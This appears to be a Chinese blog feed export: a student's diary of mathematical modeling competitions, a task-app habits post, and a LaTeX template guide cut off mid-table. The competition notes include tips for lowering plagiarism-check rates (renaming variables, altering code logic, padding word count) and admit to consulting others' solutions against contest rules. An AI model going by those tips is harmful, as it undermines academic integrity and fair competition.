<p>学习路线的问题，现在已经确定了就是选择大数据方向，那以后就可以缩小一下学习范围，以后只要学习统计方面的数学建模知识，还要学习一下excel数据处理技巧，还要把ps的使用技巧，以免什么时候要用到，还有就是要把Python数据处理的技巧进行总结还要经常练习。还有一点就是文件同步的问题</p>
<p>比赛环境问题，这次比赛的经验还不错，直接去瑞-5，不仅经常有空教室，而且插座的位置也比瑞-10要好。</p>
<p>设备管理。可以用平板来看题目，反复阅读题目，来了解题目的意思，并且可以用平板来给组员讲解题目，同时也可以将草稿写在上面</p>
<p>论文问题。有点遗憾没有进行英语的润色</p>
<p>编程软件，还是先学Python</p>
<p>个人问题，要积极参与讨论，提出自己的思路与想法</p>
<p>关于spsspro的问题，</p>
<h2 id="比赛的流程"><a href="#比赛的流程" class="headerlink" title="比赛的流程"></a>比赛的流程</h2><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><h4 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h4><p>直接就选了c题，大数据类型的题目，节省了很多时间，甚至第一天晚上就快要解决第一问了</p>
<h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><p>看论文，看一下他们采用的都是一些什么方法，有用灰色预测法的还有有关pychorn的，现在回头看来，我们应该还是要看以前的优秀论文会好一些</p>
<h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><p>进行数据的处理，将日为单位的数据合并为月为单位的数据</p>
<p>进行合并的思路很古板，将每个月份包含的日记录下来，然后按照月份，合并N（每个月包含的天数）个数据</p>
<h4 id="晚上-1"><a href="#晚上-1" class="headerlink" title="晚上"></a>晚上</h4><p>后面经过经过查找发现，数据并不是连续的，中间确实了一段，导致一晚上都在早bug，以及修改代码。</p>
<p>因为一直不了解题目的意思，还有一直不知道这五份数据的用法，导致我们错误将日期和产品编号进行预测。</p>
<h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="上午-1"><a href="#上午-1" class="headerlink" title="上午"></a>上午</h4><p>和zwh交接任务，以及交流思路，同时将昨天的拟合的数据绘制成图片，进行数据可视化。</p>
<h4 id="下午-1"><a href="#下午-1" class="headerlink" title="下午"></a>下午</h4><p>从这时候，才开始我的独立思考。</p>
<p>我将拟合的数据可视化以后，发现数据不可能这么完美肯定是有问题的。后面意识到只通过日期和产品编号是不可能正确预测出产品销量的，我终于懂得了那几份数据的用处了，那个后缀为test set其实指的同一份数据，所以要将那两份表格进行合并，最后那份the prediction of sample其实只是告诉我们要预测哪个值，和预测的日期。</p>
<p>将四份数据合并成两份，将合并数据的代码进行修改，修改完的代码整体的算法思路会更好一点，是按照「值」进行分类，然后在将分好类的组进行合并。</p>
<h4 id="晚上-2"><a href="#晚上-2" class="headerlink" title="晚上"></a>晚上</h4><p>脑子转不动了，只把数据丢进spsspro里面进行神经网络预测，也没有进行调参，也不知道预测个了啥</p>
<p>开始检查并修改论文，后来才发现原来zcy是完全不知道我们在干什么，也没有看懂题目，几乎所有的字都是有量子文章生成器生成的，下次要叫他参与我们的讨论，后面我要慢慢开始主导这个团队，因为我后来发现，整个团队就只要我是会数学建模全部流程的。</p>
<h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3><h4 id="上午-2"><a href="#上午-2" class="headerlink" title="上午"></a>上午</h4><p>进行神经网络的预测，并且绘制预测图片</p>
<p>论文的英文翻译，以及完成论文摘要</p>
<h4 id="下午-2"><a href="#下午-2" class="headerlink" title="下午"></a>下午</h4><p>编写神经网络的代码，下次不能再用spsspro了，它无法编写代码，也无法调参</p>
<p>论文查重，这次有17%的重复率，</p>
<p>还有更改论文提交格式</p>
<h4 id="晚上-3"><a href="#晚上-3" class="headerlink" title="晚上"></a>晚上</h4><p>提交论文</p>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ol>
<li><p>应该要找一个可以论文查重的东西</p>
</li>
<li><p>下次应该给zcy一点事情做</p>
<ol>
<li>主要是她这次比赛的时候还有别的事情做</li>
</ol>
</li>
<li><p>这次时间安排的不太过来，想一下是哪里的问题</p>
</li>
<li><p>这次在</p>
</li>
<li><p>如何用Python绘制表格图片，要字体大小适合，有颜色更好</p>
</li>
<li><p>论文过于口语化需要润色</p>
</li>
</ol>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ol>
<li>写论文的时候应该先用md把论文的主体内容先写，剩下在考虑排版的问题</li>
<li>排版可以放在第三天的晚上完车，方正这个差不多花个三小时就能完成</li>
<li>思考论文排版到底是用word还是latex</li>
<li>下次应该把论文提交格式认真看清楚，特别是提交的说明</li>
<li>文件要重命名</li>
<li>插入图片要有图名</li>
<li>下次比赛的时候可以用git进行文件的同步</li>
<li>尽量少熬夜</li>
<li>问题重述还是要完整的抄下来，但是可以增加总字数来降重</li>
<li>下次数学建模，我们分工不能分的太细，应该是每个人都能做建模、代码、写作，谁有事谁就可以顶上去</li>
<li>要经常看看网上的一些经验总结，可以帮自己少走很多弯路</li>
<li>下次还是用latex，但是这次需要注意的是在latex花费的时间不能再超过半天</li>
<li>论文可以用</li>
</ol>
<h2 id="写总结的技巧"><a href="#写总结的技巧" class="headerlink" title="写总结的技巧"></a>写总结的技巧</h2><ul>
<li><p>以后每次比赛应该都要记录一下这次比赛的经历</p>
<ul>
<li>还有以后做项目的时候也要这样</li>
</ul>
</li>
<li><p>要按照上午、下午、晚上的时间段把时间进行划分，记录自己的时间线，一般任务完成的当天晚上就要完成，怕过几天忘记</p>
</li>
<li><p>总结的经验的部分放在后面有时间的时候完成</p>
</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>第五次参加数学建模</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/%E7%AC%AC%E4%BA%94%E6%AC%A1%E5%8F%82%E5%8A%A0%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    <content><![CDATA[<h1 id="第五次参加数学建模"><a href="#第五次参加数学建模" class="headerlink" title="第五次参加数学建模"></a>第五次参加数学建模</h1><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="数学建模方面"><a href="#数学建模方面" class="headerlink" title="数学建模方面"></a>数学建模方面</h3><ol>
<li>这次数学解题方面还是很曲折的，特别是数据处理部分<ol>
<li>因为不知道label代表的含义，而题目也没有给出label的说明</li>
<li>导致再查找label释义上，浪费的时间有点多</li>
<li>最后还是在网络上查找的别人的思路，根据别人的思路，解决了问题<ol>
<li>虽然这样做有点不符合和比赛规范</li>
<li>但是总比几个人自己呆呆的坐在那里不知所云的想要好</li>
<li>而且这样还能获得别人的思路，相当与开阔了视野，可以收获到更多</li>
<li>这可以作为下次比赛的经验</li>
<li>但是只能作为思路，不能全抄</li>
</ol>
</li>
</ol>
</li>
<li>这次比赛还忘了要先查找相关文献</li>
</ol>
<h3 id="编程方面"><a href="#编程方面" class="headerlink" title="编程方面"></a>编程方面</h3><ol>
<li>首次采用Jupyter Notebook软件进行数据分析<ol>
<li>发现这个工具用来处理数据是真的很方便</li>
<li>因为这个是阶段性记录数据的就方便回去查找数据</li>
</ol>
</li>
<li>同时养成了很多代码方面的习惯<ol>
<li>比如用来处理数据，数据名字就命名为df，</li>
<li>机器学习，数据名字就命名为data<ol>
<li>因为网络上的很多机器学习的代码中很多都是用data命名</li>
<li>这样可以在复制代码的时候避免冲突</li>
</ol>
</li>
<li>还有发现DataFrame 的绘图功能，可以极大的减轻工作量<ol>
<li>上一次就是绘制那个时间序列的图像，绘制了很久</li>
<li>有时间要研究一下</li>
</ol>
</li>
<li>这次还掌握了如何降低论文的查重率<ol>
<li>可以改变量名字</li>
<li>改变代码逻辑</li>
<li>可以增加注释，这样不仅可以降重，方便自己理解</li>
</ol>
</li>
<li>经过这次比赛感觉自己要建立一个算法代码库<ol>
<li>里面存放一下常用的算法，还有一下常用的操作</li>
<li>还有一个问题就是算法库要用什么来编写，是py还是ipynb<ol>
<li>用ipynb，代码要根据别人的代码小改一下</li>
<li>md记录学习笔记，代码的思路，记录注意点</li>
</ol>
</li>
<li>在建立算法库的时候建议要注释，而且是英文注释</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="论文方面"><a href="#论文方面" class="headerlink" title="论文方面"></a>论文方面</h3><ol>
<li>这次论文方面没有讨论好</li>
<li>下次要用latex</li>
<li></li>
</ol>
<h2 id="比赛的流程"><a href="#比赛的流程" class="headerlink" title="比赛的流程"></a>比赛的流程</h2><h3 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h3><h4 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h4><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h4><h4 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h4><h4 id="晚上-1"><a href="#晚上-1" class="headerlink" title="晚上"></a>晚上</h4><h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="上午-1"><a href="#上午-1" class="headerlink" title="上午"></a>上午</h4><h4 id="下午-1"><a href="#下午-1" class="headerlink" title="下午"></a>下午</h4><h4 id="晚上-2"><a href="#晚上-2" class="headerlink" title="晚上"></a>晚上</h4><h3 id="第四天"><a href="#第四天" class="headerlink" title="第四天"></a>第四天</h3><h4 id="上午-2"><a href="#上午-2" class="headerlink" title="上午"></a>上午</h4><h4 id="下午-2"><a href="#下午-2" class="headerlink" title="下午"></a>下午</h4><h4 id="晚上-3"><a href="#晚上-3" class="headerlink" title="晚上"></a>晚上</h4><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>1. </p>
<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><ol>
<li>写论文的时候应该先用md把论文的主体内容先写，剩下在考虑排版的问题</li>
<li>排版可以放在第三天的晚上完车，方正这个差不多花个三小时就能完成</li>
<li>思考论文排版到底是用word还是latex</li>
<li>下次应该把论文提交格式认真看清楚，特别是提交的说明</li>
<li>文件要重命名</li>
<li>插入图片要有图名</li>
<li>下次比赛的时候可以用git进行文件的同步</li>
<li>尽量少熬夜</li>
<li>问题重述还是要完整的抄下来，但是可以增加总字数来降重</li>
<li>下次数学建模，我们分工不能分的太细，应该是每个人都能做建模、代码、写作，谁有事谁就可以顶上去</li>
<li>要经常看看网上的一些经验总结，可以帮自己少走很多弯路</li>
<li>下次还是用latex，但是这次需要注意的是在latex花费的时间不能再超过半天</li>
<li>论文可以用</li>
<li>这次还不错有了论文</li>
</ol>
<h2 id="写总结的技巧"><a href="#写总结的技巧" class="headerlink" title="写总结的技巧"></a>写总结的技巧</h2><ul>
<li>以后每次比赛应该都要记录一下这次比赛的经历 <ul>
<li>还有以后做项目的时候也要这样</li>
</ul>
</li>
<li>要按照上午、下午、晚上的时间段把时间进行划分，记录自己的时间线，一般任务完成的当天晚上就要完成，怕过几天忘记</li>
<li>总结的经验的部分放在后面有时间的时候完成</li>
</ul>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>滴答清单的使用的习惯</title>
    <url>/2023/03/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E7%9A%84%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B9%A0%E6%83%AF/</url>
    <content><![CDATA[<h2 id="任务的调整"><a href="#任务的调整" class="headerlink" title="任务的调整"></a>任务的调整</h2><h2 id="目前存在的问题"><a href="#目前存在的问题" class="headerlink" title="目前存在的问题"></a>目前存在的问题</h2><ol>
<li>要保证重要1的任务量是一天</li>
<li>每天晚上要定时调整任务，不能让任务一直积累</li>
<li>如果有必要的降低任务的重要级，使得更加重要的任务出现在上面</li>
<li>还有处理一下任务周期性的问题<ol>
<li>比如微哨打卡就属于那种需要每天打卡且重要级第一的任务</li>
<li>就是这种周期新</li>
<li>还有就是那种每日学习打卡的任务如何整理<ol>
<li>比如：每日刷算题，背单词</li>
<li>又不好放在习惯里面，因为习惯的位置比较下面，一般情况下不好看见，会导致任务被无视掉</li>
</ol>
</li>
</ol>
</li>
<li>还有就是习惯应该如何处理<ol>
<li>如果不考虑任务的优先级还是挺好用的</li>
<li>就是系统会把习惯放在下面导致不好注意到</li>
<li>现在的问题就是，原本属于习惯的内容应该如何处理<ol>
<li>？</li>
</ol>
</li>
</ol>
<p>		</p>
</li>
<li>重要级四到底应该如何使用<ol>
<li>感觉只要是放到这里任务就没有什么完成了，感觉存在感很低</li>
</ol>
</li>
<li>重要级要重新定义</li>
<li></li>
</ol>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="重要1"><a href="#重要1" class="headerlink" title="重要1"></a>重要1</h3><ol>
<li>主要今天必须完成的任务</li>
<li>同时也记录了一些非常重要的周期性任务<ol>
<li>每天必须完成的那种，如微哨，晚点名</li>
</ol>
</li>
<li>这里的任务每天最好不要超过8个</li>
<li>还有一些重大事件<ol>
<li>如比赛报名、比赛开始等</li>
<li>四六级报名</li>
<li>选修课程</li>
</ol>
</li>
</ol>
<h3 id="重要2"><a href="#重要2" class="headerlink" title="重要2"></a>重要2</h3><ol>
<li>主要记录未来三天要完成的任务</li>
<li>这里也可以记录一些周期性的学习打卡活动<ol>
<li>如刷算法题，背单词</li>
</ol>
</li>
<li>同时也可以记录一些就算不完成也不会怎么样的每日任务<ol>
<li>如图书馆预约，打卡</li>
</ol>
</li>
<li>这里的任务最好不要超过15个</li>
</ol>
<h3 id="重要3"><a href="#重要3" class="headerlink" title="重要3"></a>重要3</h3><ol>
<li>主要记录未来一周要完成的任务</li>
<li>可以用来记录一下周末作业，因为这个刚好也是一周为周期性的</li>
</ol>
<h3 id="重要4"><a href="#重要4" class="headerlink" title="重要4"></a>重要4</h3><ol>
<li>这里的任务有空就完成</li>
<li>还是设置一个时间吧，那就一个月要完成</li>
<li>同时</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>不在设置习惯这一分类</li>
<li>要每天晚上整理任务</li>
<li>到定期清理掉一些无法完成的任务</li>
<li>要特别管理一下周期性任务<ol>
<li>因为这个设置和取消都特别麻烦</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>个人思考</category>
      </categories>
  </entry>
  <entry>
    <title>LaTeX模板使用说明</title>
    <url>/2023/03/01/%E7%A7%91%E7%A0%94/LaTeX%E6%A8%A1%E6%9D%BF%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h1 id="模板使用说明"><a href="#模板使用说明" class="headerlink" title="模板使用说明"></a><img src="https://g.yuque.com/gr/latex?LaTeX#card=math&code=LaTeX&id=Y69ip">模板使用说明</h1><h2 id="使用注意"><a href="#使用注意" class="headerlink" title="使用注意"></a>使用注意</h2><ul>
<li>.cls为环境配置文件 <ul>
<li>初学者不要随意修改</li>
<li>文件主要记录了一些排版参数</li>
<li>如：一级标题的字号，字体，排列方式等</li>
</ul>
</li>
<li>.tex为项目源代码 <ul>
<li>用来编写正文</li>
</ul>
</li>
<li>要采用<strong>XeLaTeX</strong>模式编译</li>
</ul>
<h2 id="模板默认参数"><a href="#模板默认参数" class="headerlink" title="模板默认参数"></a>模板默认参数</h2><h3 id="纸张"><a href="#纸张" class="headerlink" title="纸张"></a>纸张</h3><ul>
<li>论文页面为A4纸纵向</li>
<li>上下左右各留出2.5厘米的页边距</li>
<li>论文题目和<strong>摘要</strong>在第一页上</li>
<li>第一页没有页码，从目录开始设置页码</li>
<li>有设置目录</li>
<li>有<strong>关键词</strong>，没有设置英文摘要</li>
<li>没有设置页眉</li>
<li>正文从第二页开始，页码位于<strong>每页页脚中部</strong>，用<strong>阿拉伯数字</strong>从”1”开始连续编号<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\thispagestyle&#123;empty&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\pagenumbering&#123;arabic&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\setcounter&#123;page&#125;&#123;12&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul>
<li><strong>论文题目用三号黑体字</strong>,并<strong>居中</strong> </li>
<li>一级标题用<strong>四号黑体字</strong>,并<strong>居中</strong> </li>
<li>二级、三级标题用<strong>小四号黑体字</strong>，<strong>左端对齐</strong> </li>
<li>论文中其他汉字一律采用<strong>小四号宋体字</strong>，行距用<strong>单倍行距</strong> </li>
<li>英文和公式默认设置小四号 </li>
<li>论文里面的英文单词字母也要用$$包括<blockquote>
<p>题目要求没有硬性规定,可以自由调整大小</p>
</blockquote>
</li>
</ul>
<h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><h3 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h3><table>
<thead>
<tr>
<th>LaTex表达形式</th>
<th>对应的希腊字母</th>
<th>LaTex表达形式</th>
<th>对应的希腊字母</th>
</tr>
</thead>
<tbody><tr>
<td>\alpha</td>
<td><img src="https://g.yuque.com/gr/latex?%5Calpha#card=math&code=%5Calpha&id=xmaVV"></td>
<td>\Alpha</td>
<td><img src="https://g.yuque.com/gr/latex?%5CAlpha#card=math&code=%5CAlpha&id=KOzjx"></td>
</tr>
<tr>
<td>\beta</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cbeta#card=math&code=%5Cbeta&id=Iz8DE"></td>
<td>\Beta</td>
<td><img src="https://g.yuque.com/gr/latex?%5CBeta#card=math&code=%5CBeta&id=ourp8"></td>
</tr>
<tr>
<td>\gamma</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cgamma#card=math&code=%5Cgamma&id=CpPgq"></td>
<td>\Gamma</td>
<td><img src="https://g.yuque.com/gr/latex?%5CGamma#card=math&code=%5CGamma&id=XsvxS"></td>
</tr>
<tr>
<td>\delta</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cdelta#card=math&code=%5Cdelta&id=G1iUz"></td>
<td>\Delta</td>
<td><img src="https://g.yuque.com/gr/latex?%5CDelta#card=math&code=%5CDelta&id=A3ik0"></td>
</tr>
<tr>
<td>\epsilon</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cepsilon#card=math&code=%5Cepsilon&id=tRHvz"></td>
<td>\Epsilon</td>
<td><img src="https://g.yuque.com/gr/latex?%5CEpsilon#card=math&code=%5CEpsilon&id=nN9Xy"></td>
</tr>
<tr>
<td>\zeta</td>
<td><img src="https://g.yuque.com/gr/latex?%5Czeta#card=math&code=%5Czeta&id=iwTME"></td>
<td>\Zeta</td>
<td><img src="https://g.yuque.com/gr/latex?%5CZeta#card=math&code=%5CZeta&id=fviTA"></td>
</tr>
<tr>
<td>\eta</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ceta#card=math&code=%5Ceta&id=GCOYa"></td>
<td>\Eta</td>
<td><img src="https://g.yuque.com/gr/latex?%5CEta#card=math&code=%5CEta&id=pSgdU"></td>
</tr>
<tr>
<td>\theta</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ctheta#card=math&code=%5Ctheta&id=JYIUo"></td>
<td>\Theta</td>
<td><img src="https://g.yuque.com/gr/latex?%5CTheta#card=math&code=%5CTheta&id=SzWrr"></td>
</tr>
<tr>
<td>\iota</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ciota#card=math&code=%5Ciota&id=SxEt7"></td>
<td>\Iota</td>
<td><img src="https://g.yuque.com/gr/latex?%5CIota#card=math&code=%5CIota&id=SCsz2"></td>
</tr>
<tr>
<td>\kappa</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ckappa#card=math&code=%5Ckappa&id=osGUi"></td>
<td>\Kappa</td>
<td><img src="https://g.yuque.com/gr/latex?%5CKappa#card=math&code=%5CKappa&id=PLaLu"></td>
</tr>
<tr>
<td>\lambda</td>
<td><img src="https://g.yuque.com/gr/latex?%5Clambda#card=math&code=%5Clambda&id=NapwG"></td>
<td>\Lambda</td>
<td><img src="https://g.yuque.com/gr/latex?%5CLambda#card=math&code=%5CLambda&id=a4THd"></td>
</tr>
<tr>
<td>\mu</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cmu#card=math&code=%5Cmu&id=pdJFj"></td>
<td>\Mu</td>
<td><img src="https://g.yuque.com/gr/latex?%5CMu#card=math&code=%5CMu&id=QrBcs"></td>
</tr>
<tr>
<td>\nu</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cnu#card=math&code=%5Cnu&id=vjSKl"></td>
<td>\Nu</td>
<td><img src="https://g.yuque.com/gr/latex?%5CNu#card=math&code=%5CNu&id=CvbHt"></td>
</tr>
<tr>
<td>\xi</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cxi#card=math&code=%5Cxi&id=PPZxo"></td>
<td>\Xi</td>
<td><img src="https://g.yuque.com/gr/latex?%5CXi#card=math&code=%5CXi&id=MBqkv"></td>
</tr>
<tr>
<td>\omicron</td>
<td><img src="https://g.yuque.com/gr/latex?%5Comicron#card=math&code=%5Comicron&id=zMR5D"></td>
<td>\Omicron</td>
<td><img src="https://g.yuque.com/gr/latex?%5COmicron#card=math&code=%5COmicron&id=LP5k7"></td>
</tr>
<tr>
<td>\pi</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cpi#card=math&code=%5Cpi&id=TftD7"></td>
<td>\Pi</td>
<td><img src="https://g.yuque.com/gr/latex?%5CPi#card=math&code=%5CPi&id=NfAvR"></td>
</tr>
<tr>
<td>\rho</td>
<td><img src="https://g.yuque.com/gr/latex?%5Crho#card=math&code=%5Crho&id=QcOfE"></td>
<td>\Rho</td>
<td><img src="https://g.yuque.com/gr/latex?%5CRho#card=math&code=%5CRho&id=FBZEm"></td>
</tr>
<tr>
<td>\sigma</td>
<td><img src="https://g.yuque.com/gr/latex?%5Csigma#card=math&code=%5Csigma&id=inco6"></td>
<td>\Sigma</td>
<td><img src="https://g.yuque.com/gr/latex?%5CSigma#card=math&code=%5CSigma&id=OTY3x"></td>
</tr>
<tr>
<td>\tau</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ctau#card=math&code=%5Ctau&id=k4aFC"></td>
<td>\Tau</td>
<td><img src="https://g.yuque.com/gr/latex?%5CTau#card=math&code=%5CTau&id=Uh1F8"></td>
</tr>
<tr>
<td>\upsilon</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cupsilon#card=math&code=%5Cupsilon&id=Fh0lg"></td>
<td>\Upsilon</td>
<td><img src="https://g.yuque.com/gr/latex?%5CUpsilon#card=math&code=%5CUpsilon&id=PqqdB"></td>
</tr>
<tr>
<td>\varphi</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cvarphi#card=math&code=%5Cvarphi&id=DxCKy"></td>
<td>\Phi</td>
<td><img src="https://g.yuque.com/gr/latex?%5CPhi#card=math&code=%5CPhi&id=ePRHQ"></td>
</tr>
<tr>
<td>\chi</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cchi#card=math&code=%5Cchi&id=oxuWT"></td>
<td>\Chi</td>
<td><img src="https://g.yuque.com/gr/latex?%5CChi#card=math&code=%5CChi&id=a6aZz"></td>
</tr>
<tr>
<td>\psi</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cpsi#card=math&code=%5Cpsi&id=xnezO"></td>
<td>\Psi</td>
<td><img src="https://g.yuque.com/gr/latex?%5CPsi#card=math&code=%5CPsi&id=j6HHB"></td>
</tr>
<tr>
<td>\omega</td>
<td><img src="https://g.yuque.com/gr/latex?%5Comega#card=math&code=%5Comega&id=DbgWT"></td>
<td>\Omega</td>
<td><img src="https://g.yuque.com/gr/latex?%5COmega#card=math&code=%5COmega&id=wMgLc"></td>
</tr>
</tbody></table>
<h3 id="数学公式-1"><a href="#数学公式-1" class="headerlink" title="数学公式"></a>数学公式</h3><table>
<thead>
<tr>
<th>公式名称</th>
<th><img src="https://g.yuque.com/gr/latex?LaTex#card=math&code=LaTex&id=KRavA">表达形式</th>
<th>实际效果</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>分数</td>
<td>\frac{a}{b}</td>
<td><img src="https://g.yuque.com/gr/latex?%5Cfrac%7Ba%7D%7Bb%7D#card=math&code=%5Cfrac%7Ba%7D%7Bb%7D&id=WSLgJ"></td>
<td>字体更小</td>
</tr>
<tr>
<td>分数</td>
<td>\cfrac{a}{b}</td>
<td><img src="https://g.yuque.com/gr/latex?%5Ccfrac%7Ba%7D%7Bb%7D#card=math&code=%5Ccfrac%7Ba%7D%7Bb%7D&id=rlzE1"></td>
<td>字体更大</td>
</tr>
<tr>
<td>开方</td>
<td>\sqrt{x^3}</td>
<td><img src="https://g.yuque.com/gr/latex?%5Csqrt%7Bx%5E3%7D#card=math&code=%5Csqrt%7Bx%5E3%7D&id=Ifkek"></td>
<td></td>
</tr>
<tr>
<td>开方</td>
<td>\sqrt[3]{\frac xy}</td>
<td><img src="https://g.yuque.com/gr/latex?%5Csqrt%5B3%5D%7B%5Cfrac%20xy%7D#card=math&code=%5Csqrt%5B3%5D%7B%5Cfrac%20xy%7D&id=dmyJ5"></td>
<td></td>
</tr>
<tr>
<td>对数</td>
<td>\log_{21} {xy}</td>
<td><img src="https://g.yuque.com/gr/latex?%5Clog_%7B21%7D%20%7Bxy%7D#card=math&code=%5Clog_%7B21%7D%20%7Bxy%7D&id=OAbRK"></td>
<td></td>
</tr>
<tr>
<td>求和</td>
<td>\sum</td>
<td><img src="https://g.yuque.com/gr/latex?%5Csum#card=math&code=%5Csum&id=wMWrj"></td>
<td></td>
</tr>
<tr>
<td>导数</td>
<td>{f}’(x) &#x3D; x^2 + x</td>
<td><img src="https://g.yuque.com/gr/latex?%7Bf%7D%E2%80%99(x)%20=%20x%5E2%20+%20x#card=math&code=%7Bf%7D%E2%80%99%28x%29%20%3D%20x%5E2%20%2B%20x&id=O65fO"></td>
<td></td>
</tr>
<tr>
<td>极限</td>
<td>\lim_{x \to 0} \frac {3x ^2 +7x^3} {x^2 +5x^4} &#x3D; 3</td>
<td><img src="https://g.yuque.com/gr/latex?%5Clim_%7Bx%20%5Cto%200%7D%20%5Cfrac%20%7B3x%20%5E2%20+7x%5E3%7D%20%7Bx%5E2%20+5x%5E4%7D%20=%203#card=math&code=%5Clim_%7Bx%20%5Cto%200%7D%20%5Cfrac%20%7B3x%20%5E2%20%2B7x%5E3%7D%20%7Bx%5E2%20%2B5x%5E4%7D%20%3D%203&id=eNhJ8"></td>
<td></td>
</tr>
<tr>
<td>积分</td>
<td>\int_a^b f(x) dx</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/5a406d68accdcb981f883c36e54f04d0.svg#card=math&code=%5Cint_a%5Eb%20f%28x%29%20dx%20&id=X7F0p"></td>
<td></td>
</tr>
<tr>
<td>积分</td>
<td>\int_0^{+\infty} x^n e^{-x} dx &#x3D; n!</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/559254ac774adc51a3cca1a3edbf9fc1.svg#card=math&code=%5Cint_0%5E%7B%2B%5Cinfty%7D%20x%5En%20e%5E%7B-x%7D%20dx%20%3D%20n%21%20%0A&id=mHaUk"></td>
<td></td>
</tr>
</tbody></table>
<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><table>
<thead>
<tr>
<th>LaTex 表达式</th>
<th>实际效果</th>
<th>LaTex 表达式</th>
<th>实际效果</th>
</tr>
</thead>
<tbody><tr>
<td>\lt</td>
<td>&lt;</td>
<td>\gt</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/f68d1ec1fc5a20a354d2fd017bea7b4c.svg#card=math&code=%5Cgt&id=lqNir"></td>
</tr>
<tr>
<td>\le</td>
<td>≤</td>
<td>\leq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/099d95b2a7b10bbfd2d4725d9b68eec1.svg#card=math&code=%5Cleq&id=wGCGZ"></td>
</tr>
<tr>
<td>\leqq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/0991836aeed031b0776b32fef3686d18.svg#card=math&code=%5Cleqq&id=XUoox"></td>
<td>\leqslant</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/cccc6146fd5f1329c6074cef0e3e51ef.svg#card=math&code=%5Cleqslant&id=nurk3"></td>
</tr>
<tr>
<td>\ge</td>
<td>≥</td>
<td>\geq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/566be5f7e4e2c11eee07d4d7f80810c6.svg#card=math&code=%5Cgeq&id=vwfWu"></td>
</tr>
<tr>
<td>\geqq</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/02355be35ee9fe00e2f251c20b5ad408.svg#card=math&code=%5Cgeqq&id=XBgf2"></td>
<td>\geqslant</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/e94e398336ef10e2a4058b7126a88064.svg#card=math&code=%5Cgeqslant&id=gTlD8"></td>
</tr>
<tr>
<td>\neq</td>
<td>≠</td>
<td>\not\lt</td>
<td><img src="https://cdn.nlark.com/yuque/__latex/83c49a78f88e710d3581b9adade8ce89.svg#card=math&code=%5Cnot%5Clt&id=WqGls"></td>
</tr>
<tr>
<td>\not</td>
<td>在几乎 所有的</td>
<td>符号上划出</td>
<td>一个斜线</td>
</tr>
<tr>
<td>\times</td>
<td>×</td>
<td>\div</td>
